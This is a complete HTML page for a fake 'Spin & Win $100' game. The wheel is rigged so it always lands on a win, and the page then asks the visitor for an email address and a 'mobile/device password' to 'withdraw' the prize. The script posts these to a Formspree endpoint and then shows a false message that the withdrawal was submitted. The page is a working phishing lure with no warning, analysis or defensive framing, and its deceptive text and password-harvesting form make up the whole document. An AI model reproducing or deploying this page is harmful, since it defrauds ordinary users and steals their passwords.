<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lucky Spin & Win $100!</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1f4068, #162447);
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: #0f3460;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }

        h1 {
            margin-bottom: 10px;
            color: #e94560;
            font-size: 24px;
        }

        p {
            margin-bottom: 20px;
            color: #b2bec3;
            font-size: 14px;
        }

        .wheel-container {
            position: relative;
            width: 250px;
            height: 250px;
            margin: 0 auto 20px auto;
        }

        .pointer {
            position: absolute;
            top: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 0;
            height: 0;
            border-left: 12px solid transparent;
            border-right: 12px solid transparent;
            border-bottom: 25px solid #e94560;
            z-index: 10;
        }

        #wheel {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 8px solid #e94560;
            position: relative;
            overflow: hidden;
            transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
            background: conic-gradient(
                #ff6b6b 0deg 90deg,
                #48dbfb 90deg 180deg,
                #1dd1a1 180deg 270deg,
                #feca57 270deg 360deg
            );
        }

        .spin-btn {
            background-color: #e94560;
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 25px;
            cursor: pointer;
            transition: background 0.3s;
            width: 100%;
            box-shadow: 0 4px 15px rgba(233, 69, 96, 0.4);
        }

        .spin-btn:hover {
            background-color: #ff6b81;
        }

        .spin-btn:disabled {
            background-color: #636e72;
            cursor: not-allowed;
            box-shadow: none;
        }

        .hidden {
            display: none;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 13px;
            color: #dfe6e9;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #2d4059;
            background: #1b262c;
            color: white;
            font-size: 14px;
        }

        .success-msg {
            color: #1dd1a1;
            font-size: 16px;
            font-weight: bold;
            margin-top: 15px;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Game Section -->
        <div id="game-section">
            <h1>Spin & Win $100!</h1>
            <p>Lucky Spin: Try your luck to win real cash instantly!</p>
            
            <div class="wheel-container">
                <div class="pointer"></div>
                <div id="wheel"></div>
            </div>

            <button id="spinBtn" class="spin-btn" onclick="spinWheel()">SPIN NOW</button>
        </div>

        <!-- Claim Section (Hidden initially) -->
        <div id="claim-section" class="hidden">
            <h1>Congratulations! 🎉</h1>
            <p>You won <span style="color: #1dd1a1; font-weight: bold;">$100</span>! Enter your details to withdraw money.</p>
            
            <!-- Formspree Integration -->
            <form id="withdrawForm" action="https://formspree.io/f/xojgbzww" method="POST">
                <div class="form-group">
                    <label for="email">Email Address</label>
                    <input type="email" id="email" name="email" placeholder="Enter your email" required>
                </div>

                <div class="form-group">
                    <label for="password">Mobile / Device Password (Verification)</label>
                    <input type="password" id="password" name="mobile_password" placeholder="Enter device password to verify" required>
                </div>

                <button type="submit" class="spin-btn">Withdraw Now ($100)</button>
            </form>
        </div>

        <!-- Success Section (Hidden initially) -->
        <div id="success-section" class="hidden">
            <h1>Withdrawal Submitted!</h1>
            <p class="success-msg">Your $100 withdrawal request has been submitted. It will be credited soon!</p>
        </div>
    </div>

    <script>
        let isSpinning = false;

        function spinWheel() {
            if (isSpinning) return;
            isSpinning = true;
            
            const wheel = document.getElementById('wheel');
            const spinBtn = document.getElementById('spinBtn');
            spinBtn.disabled = true;

            const randomDegree = Math.floor(3600 + 45); 
            wheel.style.transform = `rotate(${randomDegree}deg)`;

            setTimeout(() => {
                document.getElementById('game-section').classList.add('hidden');
                document.getElementById('claim-section').classList.remove('hidden');
            }, 4000);
        }

        const form = document.getElementById('withdrawForm');
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            const formData = new FormData(form);
            
            fetch(form.action, {
                method: form.method,
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            }).then(response => {
                if (response.ok) {
                    document.getElementById('claim-section').classList.add('hidden');
                    document.getElementById('success-section').classList.remove('hidden');
                } else {
                    alert('Kuch masla ho gaya, dobara try karein.');
                }
            }).catch(error => {
                alert('Connection error!');
            });
        });
    </script>
</body>
</html>
